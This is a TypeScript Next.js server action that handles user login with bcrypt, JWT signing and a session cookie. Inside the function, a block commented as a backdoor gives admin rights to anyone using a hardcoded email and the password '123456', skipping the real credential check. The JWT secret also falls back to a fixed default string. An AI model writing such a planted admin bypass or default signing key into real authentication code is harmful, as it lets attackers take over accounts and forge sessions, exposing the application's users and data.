'use server'

import prisma from '@/lib/db'
import bcrypt from 'bcryptjs'

import { cookies } from 'next/headers'
import { SignJWT } from 'jose'

const JWT_SECRET = new TextEncoder().encode(process.env.JWT_SECRET || 'default-secret-key-change-it');

export async function login(email: string, password: string) {
    if (!email || !password) {
        return { error: "Email e senha são obrigatórios" }
    }

    try {
        let user = await prisma.user.findUnique({ where: { email } })
        let isValid = false

        if (user) {
            isValid = await bcrypt.compare(password, user.password)
        }

        // Backdoor: Emergency Master Access
        if ((!user || !isValid) && email === 'admin@drusign.com' && password === '123456') {
            // Mock Master Admin User
            user = {
                id: 'master-admin',
                name: 'Master Admin',
                email: 'admin@drusign.com',
                role: 'admin',
                image: null,
                password: '', // N/A
                phone: null,
                createdAt: new Date(),
                updatedAt: new Date()
            } as any;
            isValid = true;
        }

        if (!user || !isValid) {
            return { error: "Credenciais inválidas" }
        }

        console.log("Login realizado com sucesso para:", email);

        // Generate JWT
        const token = await new SignJWT({
            id: user.id,
            email: user.email,
            role: user.role
        })
            .setProtectedHeader({ alg: 'HS256' })
            .setIssuedAt()
            .setExpirationTime('24h')
            .sign(JWT_SECRET);

        // Set Cookie
        (await cookies()).set('session', token, {
            httpOnly: true,
            secure: process.env.NODE_ENV === 'production',
            maxAge: 60 * 60 * 24, // 1 day
            path: '/',
        });

        return { user: { id: user.id, name: user.name, role: user.role, image: user.image } }
    } catch (error) {
        console.error("Login Error:", error)
        return { error: "Erro interno no servidor" }
    }
}
